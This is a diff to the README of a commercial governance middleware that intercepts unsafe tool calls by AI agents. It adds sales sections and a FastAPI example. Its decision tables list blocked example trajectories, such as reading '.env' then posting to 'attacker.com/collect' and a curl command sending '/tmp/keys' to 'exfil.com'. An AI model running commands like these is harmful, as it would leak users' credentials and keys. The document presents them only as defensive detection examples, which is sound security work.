@@ -14,6 +14,80 @@
 
 -----
 
+## Why this matters now
+
+Autonomous agents in production today **move money, read secrets, write files,
+call external APIs, modify repositories, and execute shell and tools** — often
+with minimal human review between plan and action. Output filters and prompt
+guardrails inspect content; they do not govern executable trajectories. The
+organisations most exposed are the ones already running agentic workflows in
+finance, healthcare, security, and enterprise operations — where a single
+unsafe trajectory is a financial, regulatory, or safety event, not a bad
+sentence. The cost of governance is now far below the cost of the first
+incident.
+
+-----
+
+## The 48-Hour Runtime Governance Audit
+
+**The entry point.** It is designed for organisations that have **already
+experienced agent failures, near-misses, unsafe tool use, compliance exposure,
+or autonomous workflow instability** — and need to know, concretely, which
+catastrophic trajectories are reachable before they execute.
+
+You provide your agent architecture: tool definitions, planner output format,
+target domains. **No model access or weights required** — we evaluate the
+trajectory geometry, not the model.
+
+**Deliverables, within 48 hours:**
+
+| # | Deliverable                       | What it is                                                                 |
+|:-:|:----------------------------------|:---------------------------------------------------------------------------|
+| 1 | **Executable trajectory analysis**| Your real tool-call plans extracted and evaluated as trajectories          |
+| 2 | **Reachable Ω states**            | Which catastrophic states are reachable from your current architecture     |
+| 3 | **Blocked vs. permitted paths**   | The exact partition: what executes, what is intercepted, and at which layer |
+| 4 | **Audit logs**                    | Per-decision, timestamped, layer-attributed, deterministic and replayable  |
+| 5 | **Risk summary**                  | Prioritised attack surface ranked by reachability and consequence          |
+| 6 | **Integration recommendations**   | Concrete middleware placement and Ω configuration for your stack           |
+
+Timeline: **48 hours** · Investment band: **£18K–25K**.
+
+-----
+
+## Rescue Use Case
+
+The strongest deployment entry point is not a greenfield integration. It is
+helping an organisation identify and contain failures that are **already
+beginning to emerge** in autonomous systems.
+
+> **Find the system that has already crashed, nearly crashed, or is clearly
+> drifting toward unsafe execution — then prove which catastrophic trajectories
+> are reachable before they execute.**
+
+When an autonomous workflow has produced an incident, a near-miss, an
+unexplained action, a compliance scare, or visible instability, the audit
+converts that ambiguity into a concrete, reproducible map: the specific tool
+trajectories that reach Ω, the layer that intercepts each, and the integration
+that contains them. **Rescue first, harden second, expand third.**
+
+-----
+
+## Who this is for (target customers)
+
+| Segment                         | Trigger                                                                 |
+|:--------------------------------|:------------------------------------------------------------------------|
+| Financial services / fintech    | Agents touching payments, trading, client comms; FCA/SOX exposure       |
+| Healthcare / life sciences      | Agents touching PHI, clinical decisions; HIPAA / patient-safety exposure|
+| Security / infrastructure       | Agents with shell, repo, or cloud access; credential and RCE exposure   |
+| Enterprise automation platforms | Multi-agent / autonomous workflows where one bad action is board-level  |
+| Public sector / defence         | Autonomous systems requiring structural, not behavioural, guarantees    |
+
+The common trigger: an agent system that **can execute actions** and has
+already shown — or is one incident away from showing — that behavioural
+alignment alone does not contain it.
+
+-----
+
 ## 1. The Operational Problem
 
 These are not hypothetical scenarios. They are the failure modes of every organisation deploying tool-using AI agents today.
@@ -101,7 +175,7 @@ The governance layer does not fix the planner. It does not retrain it. It does n
 
 |Step 1                             |Step 2                                    |Decision  |Layer |Reason                       |
 |:----------------------------------|:-----------------------------------------|:--------:|:-----|:----------------------------|
-|`read_file(path=".env")`           |`http_request(url="attacker.com/collect")`|**BLOCK** |V3    |Credential exfiltration chain|
+|`read_file(path=".env")`           |`http_request(url="attacker.com/collect")`|**BLOCK** |V2    |Credential exfiltration chain (source→sink taint)|
 |`list_files(path="/home")`         |`shell("curl exfil.com -d @/tmp/keys")`   |**BLOCK** |A_safe|Delayed intent escalation    |
 |`read_file(path="/data/sales.csv")`|`analyze(type="quarterly_summary")`       |**PERMIT**|—     |Safe multi-step workflow     |
 
@@ -207,7 +281,7 @@ Including:
 
 |Pain                   |Consequence                    |Governance Outcome                                          |
 |:----------------------|:------------------------------|:-----------------------------------------------------------|
-|Credential exfiltration|Full infrastructure compromise |Blocked at V3 — read→exfiltrate chain detected              |
+|Credential exfiltration|Full infrastructure compromise |Blocked at V2 — read→exfiltrate chain detected (source→sink taint)|
 |Shell injection        |System destruction, data loss  |Blocked at A_safe — command patterns intercepted            |
 |Privilege escalation   |Root access compromised        |Blocked at A_safe — sudo/chmod patterns detected            |
 |Chained tool attacks   |Invisible multi-step data theft|Blocked at V2/V3 — trajectory drift and forward reachability|
@@ -278,8 +352,23 @@ if result.permitted:
 
 ### HTTP Middleware
 
+The package *is* the middleware — wrap `GovernanceLayer` behind any framework
+(no bundled server; ~10 lines with FastAPI):
+
+```python
+# server.py
+from fastapi import FastAPI
+from morrison_governance import GovernanceLayer, OmegaDomain
+app = FastAPI()
+gov = GovernanceLayer(domains=[OmegaDomain.FINANCE, OmegaDomain.CYBERSECURITY])
+
+@app.post("/evaluate")
+def evaluate(call: dict):
+    return gov.evaluate(call).to_dict()
+```
+
 ```bash
-uvicorn examples.server:app --host 0.0.0.0 --port 8000
+uvicorn server:app --host 0.0.0.0 --port 8000
 ```
 
 ```bash
@@ -364,6 +453,25 @@ The framework is infrastructure-oriented, not morality-oriented. It defines what
 ### Start Here
 
 Send your agent architecture documentation (tool definitions, planner format, target domains) to begin a free scope confirmation. No model access required. We evaluate the trajectory geometry, not the model.
+
+-----
+
+## What a client gets at the end
+
+By the close of the audit (or each pilot milestone), a client holds:
+
+- A **concrete map of reachable Ω** for their actual agent architecture — not a generic threat list
+- The **blocked-vs-permitted partition** with per-decision, layer-attributed, **deterministic and replayable** audit logs
+- A **prioritised risk summary** ranked by reachability and operational consequence
+- **Integration recommendations**: exactly where the governance middleware sits and how Ω is configured for their stack
+- For pilots: governance middleware **running in staging**, the full evaluation suite against their domains, and a **production deployment plan**
+- Governance that is **model-agnostic** — it survives planner/model swaps, because enforcement is at the executable-trajectory layer, not the model-weight layer
+
+Bounded honestly: results are validated across the tested scenarios and are
+reproducible by cloning and running the repository; they are evidence within
+the evaluated suites, not a universal guarantee. Independent red-teaming is a
+welcomed next step and is the posture the framework is built for (see
+[`CRITICAL_EVALUATION.md`](CRITICAL_EVALUATION.md)).
 
 -----
 
